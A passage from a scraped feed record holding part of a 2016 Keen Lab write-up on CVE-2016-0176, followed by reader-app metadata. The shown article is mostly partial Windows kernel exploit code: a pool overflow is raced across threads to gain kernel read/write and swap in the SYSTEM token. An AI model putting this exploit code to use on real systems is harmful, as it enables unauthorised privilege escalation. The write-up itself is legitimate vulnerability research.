class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td> \n   <td class=\"code\"><pre><span class=\"line\"><span class=\"function\">VOID <span class=\"title\">ThPresent</span><span class=\"params\">(THREAD_HOST * th)</span></span><br><span class=\"line\"></span>{</br></span><br><span class=\"line\">    SIZE_T hint = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> (TRUE)</span><br><span class=\"line\">    {</span><br><span class=\"line\">        HIST_TOKEN ht = { <span class=\"number\">0</span>, };</span><br><span class=\"line\"> HtInitialize(&amp;ht);</span><br><span class=\"line\"></span><br><span class=\"line\"> SIZE_T victim_surf_obj = ThNextGuessedAddr(th, ++hint);</span><br><span class=\"line\"></span><br><span class=\"line\"> SIZE_T buffer_ptr = victim_surf_obj + <span class=\"number\">0x200000</span> + <span class=\"number\">0x18</span>;</span><br><span class=\"line\"> th-&gt;backupBufferPtr1 = victim_surf_obj + <span class=\"number\">0x258</span>;</span><br><span class=\"line\"> th-&gt;backupBufferPtr2 = victim_surf_obj + <span class=\"number\">0x200000</span> + <span class=\"number\">0x258</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"> SIZE_T back_offset = <span class=\"number\">0x10</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"> SURFOBJ surf_obj = { <span class=\"number\">0</span>, };</span><br><span class=\"line\"></span><br><span class=\"line\"> surf_obj.cjBits = <span class=\"number\">0x80</span>;</span><br><span class=\"line\"> surf_obj.pvBits = (PVOID)buffer_ptr;</span><br><span class=\"line\"> surf_obj.pvScan0 = (PVOID)buffer_ptr;</span><br><span class=\"line\"> surf_obj.sizlBitmap.cx = <span class=\"number\">0x04</span>;</span><br><span class=\"line\"> surf_obj.sizlBitmap.cy = <span class=\"number\">0x08</span>;</span><br><span class=\"line\"> surf_obj.iBitmapFormat = <span class=\"number\">0x06</span>;</span><br><span class=\"line\"> surf_obj.iType = <span class=\"number\">0</span>;</span><br><span class=\"line\"> surf_obj.fjBitmap = <span class=\"number\">0x01</span>;</span><br><span class=\"line\"> surf_obj.lDelta = <span class=\"number\">0x10</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"> DWORD dwBuff = <span class=\"number\">0x04800200</span>;</span><br><span class=\"line\"> HtSetBuffer(&amp;ht, <span class=\"number\">0x18</span> + th-&gt;memberOffset - back_offset, (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">char</span>*)&amp;surf_obj, <span class=\"number\">0x68</span>);</span><br><span class=\"line\"> HtSetBuffer(&amp;ht, <span class=\"number\">0x70</span> + th-&gt;memberOffset - back_offset, &amp;dwBuff, <span class=\"keyword\">sizeof</span>(DWORD));</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"keyword\">if</span> (th-&gt;memberOffset - back_offset + <span class=\"number\">0xE8</span> &lt; <span class=\"number\">0x448</span>)</span><br><span class=\"line\"> {</span><br><span class=\"line\"> SIZE_T qwBuff = victim_surf_obj + <span class=\"number\">0xE0</span>;</span><br><span class=\"line\"> HtSetBuffer(&amp;ht, <span class=\"number\">0xE0</span> + th-&gt;memberOffset - back_offset, &amp;qwBuff, <span class=\"keyword\">sizeof</span>(SIZE_T));</span><br><span class=\"line\"> HtSetBuffer(&amp;ht, <span class=\"number\">0xE8</span> + th-&gt;memberOffset - back_offset, &amp;qwBuff, <span class=\"keyword\">sizeof</span>(SIZE_T));</span><br><span class=\"line\"> }</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"keyword\">if</span> (th-&gt;memberOffset - back_offset + <span class=\"number\">0x1C0</span> &lt; <span class=\"number\">0x448</span>)</span><br><span class=\"line\"> {</span><br><span class=\"line\"> SIZE_T qwBuff = victim_surf_obj + <span class=\"number\">0x1B8</span>;</span><br><span class=\"line\"> HtSetBuffer(&amp;ht, <span class=\"number\">0x1B8</span> + th-&gt;memberOffset - back_offset, &amp;qwBuff, <span class=\"keyword\">sizeof</span>(SIZE_T));</span><br><span class=\"line\"> HtSetBuffer(&amp;ht, <span class=\"number\">0x1C0</span> + th-&gt;memberOffset - back_offset, &amp;qwBuff, <span class=\"keyword\">sizeof</span>(SIZE_T));</span><br><span class=\"line\"> }</span><br><span class=\"line\"></span><br><span class=\"line\"> HtOverflowNextSListEntry(&amp;ht, victim_surf_obj);</span><br><span class=\"line\"> HtTrigger(&amp;ht);</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"keyword\">if</span> (th-&gt;triggered)</span><br><span class=\"line\"> <span class=\"keyword\">break</span>;</span><br><span class=\"line\"> }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">VOID <span class=\"title\">ThTrigger</span><span class=\"params\">(THREAD_HOST * th)</span></span><br><span class=\"line\"></span>{</br></span><br><span class=\"line\"> SIZE_T i = <span class=\"number\">0</span>;</span><br><span class=\"line\"> HANDLE threads[TH_MAX_THREADS] = { <span class=\"number\">0</span>, };</span><br><span class=\"line\"> <span class=\"keyword\">unsigned</span> <span class=\"keyword\">char</span> second_buffer[<span class=\"number\">0x78</span>] = { <span class=\"number\">0</span>, };</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"keyword\">for</span> (SIZE_T i = <span class=\"number\">0</span>; i &lt; TH_MAX_THREADS; i++)</span><br><span class=\"line\"> {</span><br><span class=\"line\"> <span class=\"keyword\">if</span> (th-&gt;triggered)</span><br><span class=\"line\"> {</span><br><span class=\"line\"> <span class=\"keyword\">break</span>;</span><br><span class=\"line\"> }</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"keyword\">if</span> (i == <span class=\"number\">9</span>)</span><br><span class=\"line\"> {</span><br><span class=\"line\"> DWORD thread_id = <span class=\"number\">0</span>;</span><br><span class=\"line\"> threads[i] = CreateThread(<span class=\"literal\">NULL</span>, <span class=\"number\">0</span>, ProbeThreadProc, th, <span class=\"number\">0</span>, &amp;thread_id);</span><br><span class=\"line\"> }</span><br><span class=\"line\"> <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (i % <span class=\"number\">3</span> != <span class=\"number\">0</span> &amp;&amp; i &gt; <span class=\"number\">0x10</span>)</span><br><span class=\"line\"> {</span><br><span class=\"line\"> DWORD thread_id = <span class=\"number\">0</span>;</span><br><span class=\"line\"> threads[i] = CreateThread(<span class=\"literal\">NULL</span>, <span class=\"number\">0</span>, PresentThreadProc, th, <span class=\"number\">0</span>, &amp;thread_id);</span><br><span class=\"line\"> } </span><br><span class=\"line\"> <span class=\"keyword\">else</span></span><br><span class=\"line\"> {</span><br><span class=\"line\"> DWORD thread_id = <span class=\"number\">0</span>;</span><br><span class=\"line\"> threads[i] = CreateThread(<span class=\"literal\">NULL</span>, <span class=\"number\">0</span>, BitbltThreadProc, th, <span class=\"number\">0</span>, &amp;thread_id);</span><br><span class=\"line\"> }</span><br><span class=\"line\"> }</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; TH_MAX_THREADS; i++)</span><br><span class=\"line\"> {</span><br><span class=\"line\"> <span class=\"keyword\">if</span> (threads[i] != <span class=\"literal\">NULL</span>)</span><br><span class=\"line\"> {</span><br><span class=\"line\"> <span class=\"keyword\">if</span> (WAIT_OBJECT_0 == WaitForSingleObject(threads[i], INFINITE))</span><br><span class=\"line\"> {</span><br><span class=\"line\"> CloseHandle(threads[i]);</span><br><span class=\"line\"> threads[i] = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\"> }</span><br><span class=\"line\"> }</span><br><span class=\"line\"> }</span><br><span class=\"line\"></span><br><span class=\"line\"> Log(<span class=\"string\">\"trigged\\n\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"> ThRead(th, (<span class=\"keyword\">const</span> <span class=\"keyword\">void</span>*)th-&gt;backupBufferPtr2, second_buffer, <span class=\"number\">0x78</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"> ADDR_RESOLVER ar = { <span class=\"number\">0</span>, };</span><br><span class=\"line\"> ArInitialize(&amp;ar, th);</span><br><span class=\"line\"></span><br><span class=\"line\"> SIZE_T nt_addr = ArNTBase(&amp;ar); </span><br><span class=\"line\"> SIZE_T psp_cid_table_addr = nt_addr + PSP_CIDTABLE_OFFSET;</span><br><span class=\"line\"> SIZE_T psp_cid_table_value;</span><br><span class=\"line\"></span><br><span class=\"line\"> ThRead(th, psp_cid_table_addr, &amp;psp_cid_table_value, <span class=\"number\">0x08</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"> SIZE_T psp_cid_table[<span class=\"number\">0x0C</span>] = { <span class=\"number\">0</span>, };</span><br><span class=\"line\"> ThRead(th, psp_cid_table_value, psp_cid_table, <span class=\"number\">0x60</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"> SIZE_T table_code = psp_cid_table[<span class=\"number\">1</span>];</span><br><span class=\"line\"> SIZE_T handle_count = psp_cid_table[<span class=\"number\">0x0B</span>] &amp; <span class=\"number\">0x00000000ffffffff</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"> SIZE_T curr_pid = GetCurrentProcessId();</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"keyword\">do</span></span><br><span class=\"line\"> {</span><br><span class=\"line\"> ThParseCidTable(th, table_code, handle_count);</span><br><span class=\"line\"> Sleep(<span class=\"number\">1000</span>);</span><br><span class=\"line\"> } <span class=\"keyword\">while</span> (th-&gt;currentEprocess == <span class=\"literal\">NULL</span> || th-&gt;systemEprocess == <span class=\"literal\">NULL</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"> SIZE_T curr_proc = th-&gt;currentEprocess;</span><br><span class=\"line\"> SIZE_T system_proc = th-&gt;systemEprocess;</span><br><span class=\"line\"></span><br><span class=\"line\"> SIZE_T system_token = <span class=\"number\">0</span>;</span><br><span class=\"line\"> ThRead(th, (system_proc + <span class=\"number\">0x358</span>), &amp;system_token, <span class=\"number\">0x08</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"> SIZE_T curr_token = <span class=\"number\">0</span>;</span><br><span class=\"line\"> ThRead(th, (curr_proc + <span class=\"number\">0x358</span>), &amp;curr_token, <span class=\"number\">0x08</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"> ThWrite(th, (curr_proc + <span class=\"number\">0x358</span>), &amp;system_token, <span class=\"number\">0x08</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"> ThRead(th, (curr_proc + <span class=\"number\">0x358</span>), &amp;curr_token, <span class=\"number\">0x08</span>);</span><br><span class=\"line\"> </span><br><span class=\"line\"> ThRestore(th);</span><br><span class=\"line\"></span><br><span class=\"line\"> Log(<span class=\"string\">\"elevated\\n\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"> Sleep(<span class=\"number\">3600000</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"keyword\">return</span>;</span><br><span class=\"line\">}</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td> \n  </tr> \n </table> \n</figure> \n<h3 id=\"参考\"><a href=\"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/#参考\" class=\"headerlink\" title=\"参考:\"></a>参考:</h3> \n<ol> \n <li><a href=\"https://ruxcon.org.au/assets/2016/slides/Rainbow_over_the_Windows.pdf\" target=\"_blank\" rel=\"external\">Rainbow Over the Windows</a></li> \n <li><a href=\"https://github.com/long123king/tokenext/blob/master/doc/Did_You_Get_Your_Token.pdf\" target=\"_blank\" rel=\"external\">Did You Get Your Token?</a></li> \n <li><a href=\"http://www.slideshare.net/PeterHlavaty/windows-kernel-exploitation-this-time-font-hunt-you-down-in-4-bytes\" target=\"_blank\" rel=\"external\">Windows Kernel Exploitation : This Time Font hunt you down in 4 bytes</a></li> \n <li><a href=\"https://media.blackhat.com/bh-dc-11/Mandt/BlackHat_DC_2011_Mandt_kernelpool-wp.pdf\" target=\"_blank\" rel=\"external\">Kernel Pool Exploitation on Windows 7</a></li> \n</ol>","descriptionType":"html","publishedDate":"Fri, 18 Nov 2016 07:08:12 +0000","feedId":22909,"bgimg":"http://keenlab.tencent.com/zh/img/A-Link-To-System-Privilege/edge_eop_img_1.svg","linkMd5":"b053f98b0900f3e9efc44e1aa86f6b4f","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx16/cdn81@2020_6/2020/10/18/17-46-22-629_853edefb53492562.svg","destWidth":0,"destHeight":0,"sourceBytes":36842,"destBytes":36842,"author":"","articleImgCdnMap":{"http://keenlab.tencent.com/zh/img/A-Link-To-System-Privilege/edge_eop_img_1.svg":"https://cdn.jsdelivr.net/gh/myreaderx16/cdn81@2020_6/2020/10/18/17-46-22-629_853edefb53492562.svg","http://keenlab.tencent.com/zh/img/A-Link-To-System-Privilege/edge_eop_img_2.svg":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn26@2020_1/2020/10/18/17-46-27-416_ddff230e6fbb7e76.svg","http://keenlab.tencent.com/zh/img/A-Link-To-System-Privilege/edge_eop_img_3.svg":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn21@2020_5/2020/10/18/17-46-27-921_31496d6c6bc3d575.svg","http://keenlab.tencent.com/zh/img/A-Link-To-System-Privilege/edge_eop_img_4.svg":"https://cdn.jsdelivr.net/gh/myreaderx7/cdn18@2020_5/2020/10/18/17-46-27-832_7fa609b53ad9940b.svg","http://keenlab.tencent.com/zh/img/A-Link-To-System-Privilege/edge_eop_img_5.svg":"https://cdn.jsdelivr.net/gh/myreaderx29/cdn14@2020_4/2020/10/18/17-46-26-310_9ca4ea052113e00f.svg","http://keenlab.tencent.com/zh/img/A-Link-To-System-Privilege/edge_eop_img_6.svg":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn9@2020_1/2020/10/18/17-46-27-447_9f53667a68b9765f.svg","http://keenlab.tencent.com/zh/img/A-Link-To-System-Privilege/edge_eop_img_7.svg":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn6@2020_1/2020/10/18/17-46-27-251_bcebaa73812b1c42.svg","http://keenlab.tencent.com/zh/img/A-Link-To-System-Privilege/edge_eop_img_9.svg":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn90@2020_4/2020/10/18/17-46-26-871_547cfb73d31fc4df.svg","http://keenlab.tencent.com/zh/img/A-Link-To-System-Privilege/edge_eop_img_10.svg":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn2@2020_2/2020/10/18/17-46-27-795_0d7635aff112fd2a.svg","http://keenlab.tencent.com/zh/img/A-Link-To-System-Privilege/edge_eop_img_11.svg":"https://cdn.jsdelivr.net/gh/myreaderx19/cdn98@2020_3/2020/10/18/17-46-28-978_5d51455dfba04fa5.svg","http://keenlab.tencent.com/zh/img/A-Link-To-System-Privilege/edge_eop_img_12.svg":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn93@2020_4/2020/10/18/17-46-26-828_05188ff34f707b33.svg","http://keenlab.tencent.com/zh/img/A-Link-To-System-Privilege/edge_eop_img_13.svg":null},"publishedOrCreatedDate":1603043172299}],"record":{"createdTime":"2020-10-19 01:46:12","updatedTime":"2020-10-19 01:46:12","feedId":22909,"fetchDate":"Sun, 18 Oct 2020 17:46:12 +0000","fetchMs":3716,"handleMs":5473,"totalMs":27834,"newArticles":0,"totalArticles":15,"status":1,"type":0,"ip":"8f63d61dafbb91e16a52716ac9e06b5a","hostName":"us-030*","requestId":"cf01353ba19f4ab6bfa6207aa50ada5f_22909","contentType":"text/xml; charset=utf8","totalBytes":285437,"bgimgsTotal":1,"bgimgsGithubTotal":1,"articlesImgsTotal":12,"articlesImgsGithubTotal":11,"successGithubMap":{"myreaderx8":1,"myreaderx25":1,"myreaderx7":1,"myreaderx16":1,"myreaderx27":1,"myreaderx10":1,"myreaderx21":1,"myreaderx4":1,"myreaderx2":1,"myreaderx29":1,"myreaderx19":1},"failGithubMap":{"myreaderx14":1}},"feed":{"createdTime":"2020-09-07 02:28:57","updatedTime":"2020-09-21 02:45:39","id":22909,"name":"腾讯科恩实验室官方博客","url":"http://keenlab.tencent.com/zh/atom.xml","subscriber":144,"website":null,"icon":"http://keenlab.tencent.com/favicon.ico","icon_jsdelivr":null,"description":"","weekly":null,"link":"http://keenlab.tencent.com"},"noPictureArticleList":[{"createdTime":"2020-10-19 01:46:29","updatedTime":"2020-10-19 01:46:29","id":null,"feedId":22909,"linkMd5":"b053f98b0900f3e9efc44e1aa86f6b4f"}],"tmpCommonImgCdnBytes":36842,"tmpBodyImgCdnBytes":248595,"tmpBgImgCdnBytes":0,"extra4":{"start":1603043162006,"total":0,"statList":[{"spend":4820,"msg":"获取xml内容"},{"spend":5473,"msg":"解释文章"},{"spend":0,"msg":"上传封面图到cdn"},{"spend":0,"msg":"修正封面图上传失败重新上传"},{"spend":6358,"msg":"正文链接上传到cdn"}]},"extra5":12,"extra6":12,"extra7ImgCdnFailResultVector":[{"code":1,"isDone":false,"source":"http://keenlab.tencent.com/zh/img/A-Link-To-System-Privilege/edge_eop_img_13.svg","sourceStatusCode":200,"destWidth":0,"destHeight":0,"sourceBytes":24902,"destBytes":24902,"feedId":22909,"totalSpendMs":4137,"convertSpendMs":0,"createdTime":"2020-10-19 01:46:23","host":"us-001*","referer":"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/","linkMd5ListStr":"b053f98b0900f3e9efc44e1aa86f6b4f","rawMap":{"githubUrl":"https://api.github.com/repos/myreaderx14/cdn86/contents/2020/10/18/17-46-27-597_749ef8e9b32ee1bf.svg","resp":{"code":403,"msg":"Forbidden","body":"{\n  \"message\": \"API rate limit exceeded for user ID 68584859.\",\n  \"documentation_url\": \"https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting\"\n}\n","headerMap":{"access-control-allow-origin":["*"],"access-control-expose-headers":["ETag, Link, Location, Retry-After, X-GitHub-OTP, X-RateLimit-Limit, X-RateLimit-Remaining, X-RateLimit-Used, X-RateLimit-Reset, X-OAuth-Scopes, X-Accepted-OAuth-Scopes, X-Poll-Interval, X-GitHub-Media-Type, Deprecation, Sunset"],"content-security-policy":["default-src 'none'"],"content-type":["application/json; charset=utf-8"],"date":["Sun, 18 Oct 2020 17:46:27 GMT"],"referrer-policy":["origin-when-cross-origin, strict-origin-when-cross-origin"],"server":["GitHub.com"],"status":["403 Forbidden"],"strict-transport-security":["max-age=31536000; includeSubdomains; preload"],"transfer-encoding":["chunked"],"vary":["Accept-Encoding, Accept, X-Requested-With"],"x-accepted-oauth-scopes":["repo"],"x-content-type-options":["nosniff"],"x-frame-options":["deny"],"x-github-media-type":["github.v3; format=json"],"x-github-request-id":["D2EA:0AEC:71DCBC:137B0EF:5F8C7F70"],"x-oauth-scopes":["admin:enterprise, admin:gpg_key, admin:org, admin:org_hook, admin:public_key, admin:repo_hook, delete:packages, delete_repo, gist, notifications, read:packages, repo, user, workflow, write:discussion, write:packages"],"x-ratelimit-limit":["60"],"x-ratelimit-remaining":["0"],"x-ratelimit-reset":["1603044121"],"x-ratelimit-used":["60"],"x-xss-protection":["1; mode=block"]},"exceptionMsg":"Unexpected code 403,url is : https://api.github.com/repos/myreaderx14/cdn86/contents/2020/10/18/17-46-27-597_749ef8e9b32ee1bf.svg","historyStatusCode":[],"spendMs":55},"base64UserPassword":null,"token":"6b67d******************************91b08"},"githubUser":"myreaderx14","githubHttpCode":403,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"24.3 KB","destSize":"24.3 KB","compressRate":"100%"},{"code":1,"isDone":false,"source":"http://keenlab.tencent.com/zh/img/A-Link-To-System-Privilege/edge_eop_img_13.svg","sourceStatusCode":200,"destWidth":0,"destHeight":0,"sourceBytes":24902,"destBytes":24902,"feedId":22909,"totalSpendMs":2009,"convertSpendMs":0,"createdTime":"2020-10-19 01:46:27","host":"europe-56*","referer":"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/","linkMd5ListStr":"b053f98b0900f3e9efc44e1aa86f6b4f","rawMap":{"githubUrl":"https://api.github.com/repos/myreaderx14/cdn86/contents/2020/10/18/17-46-29-457_749ef8e9b32ee1bf.svg","resp":{"code":403,"msg":"Forbidden","body":"{\n  \"message\": \"API rate limit exceeded for user ID 68584859.\",\n  \"documentation_url\": \"https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting\"\n}\n","headerMap":{"access-control-allow-origin":["*"],"access-control-expose-headers":["ETag, Link, Location, Retry-After, X-GitHub-OTP, X-RateLimit-Limit, X-RateLimit-Remaining, X-RateLimit-Used, X-RateLimit-Reset, X-OAuth-Scopes, X-Accepted-OAuth-Scopes, X-Poll-Interval, X-GitHub-Media-Type, Deprecation, Sunset"],"content-security-policy":["default-src 'none'"],"content-type":["application/json; charset=utf-8"],"date":["Sun, 18 Oct 2020 17:46:29 GMT"],"referrer-policy":["origin-when-cross-origin, strict-origin-when-cross-origin"],"server":["GitHub.com"],"status":["403 Forbidden"],"strict-transport-security":["max-age=31536000; includeSubdomains; preload"],"transfer-encoding":["chunked"],"vary":["Accept-Encoding, Accept, X-Requested-With"],"x-accepted-oauth-scopes":["repo"],"x-content-type-options":["nosniff"],"x-frame-options":["deny"],"x-github-media-type":["github.v3; format=json"],"x-github-request-id":["96A0:2F1D:6DAADEE:7E6AB2F:5F8C7F73"],"x-oauth-scopes":["admin:enterprise, admin:gpg_key, admin:org, admin:org_hook, admin:public_key, admin:repo_hook, delete:packages, delete_repo, gist, notifications, read:packages, repo, user, workflow, write:discussion, write:packages"],"x-ratelimit-limit":["60"],"x-ratelimit-remaining":["0"],"x-ratelimit-reset":["1603044121"],"x-ratelimit-used":["60"],"x-xss-protection":["1; mode=block"]},"exceptionMsg":"Unexpected code 403,url is : https://api.github.com/repos/myreaderx14/cdn86/contents/2020/10/18/17-46-29-457_749ef8e9b32ee1bf.svg","historyStatusCode":[],"spendMs":253},"base64UserPassword":null,"token":"6b67d******************************91b08"},"githubUser":"myreaderx14","githubHttpCode":403,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"24.3 KB","destSize":"24.3 KB","compressRate":"100%"}],"extra10_invalidATagHrefValue":{"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/_#如何攻破微软的Edge浏览器":"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/#如何攻破微软的Edge浏览器","http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/_#尝试2：在多线程中循环调用D3DKMTPresent并传入可导致溢出的buffer。":"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/#尝试2：在多线程中循环调用D3DKMTPresent并传入可导致溢出的buffer。","http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/_#偷换令牌":"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/#偷换令牌","http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/_#如何达到可重复的内核态任意地址读写":"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/#如何达到可重复的内核态任意地址读写","http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/_#尝试3：在多线程中循环调用D3DKMTPresent并传入可导致溢出的buffer，同时在另外一批多线程中循环调用BitBlt。":"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/#尝试3：在多线程中循环调用D3DKMTPresent并传入可导致溢出的buffer，同时在另外一批多线程中循环调用BitBlt。","http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/_#尝试1：循环调用D3DKMTPresent并传入可导致溢出的buffer。":"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/#尝试1：循环调用D3DKMTPresent并传入可导致溢出的buffer。","http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/_#部分利用代码":"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/#部分利用代码","http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/_#方案2：溢出相邻的单链表头部，转化成单链表利用":"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/#方案2：溢出相邻的单链表头部，转化成单链表利用","http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/_#CVE-2016-0176漏洞及利用详解":"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/#CVE-2016-0176漏洞及利用详解","http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/_#CVE-2016-0176":"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/#CVE-2016-0176","http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/_#方案1：溢出0x2290偏移后面的复用的小内存分配空间":"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/#方案1：溢出0x2290偏移后面的复用的小内存分配空间","http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/_#其他技巧":"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/#其他技巧","http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/_#参考":"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/#参考","http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/_#利用":"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/#利用"},"extra111_proxyServerAndStatMap":{"http://europe-56.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://us-001.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://europe68.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-017.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-021.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://europe64.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-005.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-034.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-009.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-52.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-029.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]}},"extra12ImgCdnSuccessResultVector":[{"code":1,"isDone":false,"source":"http://keenlab.tencent.com/zh/img/A-Link-To-System-Privilege/edge_eop_img_1.svg","sourceStatusCode":200,"destWidth":0,"destHeight":0,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx16/cdn81@2020_6/2020/10/18/17-46-22-629_853edefb53492562.svg","sourceBytes":36842,"destBytes":36842,"feedId":22909,"totalSpendMs":4408,"convertSpendMs":0,"createdTime":"2020-10-19 01:46:19","host":"us-013*","referer":"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/","linkMd5ListStr":"b053f98b0900f3e9efc44e1aa86f6b4f,b053f98b0900f3e9efc44e1aa86f6b4f","githubUser":"myreaderx16","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"36 KB","destSize":"36 KB","compressRate":"100%"},{"code":1,"isDone":false,"source":"http://keenlab.tencent.com/zh/img/A-Link-To-System-Privilege/edge_eop_img_5.svg","sourceStatusCode":200,"destWidth":0,"destHeight":0,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx29/cdn14@2020_4/2020/10/18/17-46-26-310_9ca4ea052113e00f.svg","sourceBytes":24792,"destBytes":24792,"feedId":22909,"totalSpendMs":3750,"convertSpendMs":0,"createdTime":"2020-10-19 01:46:23","host":"europe-56*","referer":"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/","linkMd5ListStr":"b053f98b0900f3e9efc44e1aa86f6b4f","githubUser":"myreaderx29","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"24.2 KB","destSize":"24.2 KB","compressRate":"100%"},{"code":1,"isDone":false,"source":"http://keenlab.tencent.com/zh/img/A-Link-To-System-Privilege/edge_eop_img_12.svg","sourceStatusCode":200,"destWidth":0,"destHeight":0,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn93@2020_4/2020/10/18/17-46-26-828_05188ff34f707b33.svg","sourceBytes":24801,"destBytes":24801,"feedId":22909,"totalSpendMs":4144,"convertSpendMs":0,"createdTime":"2020-10-19 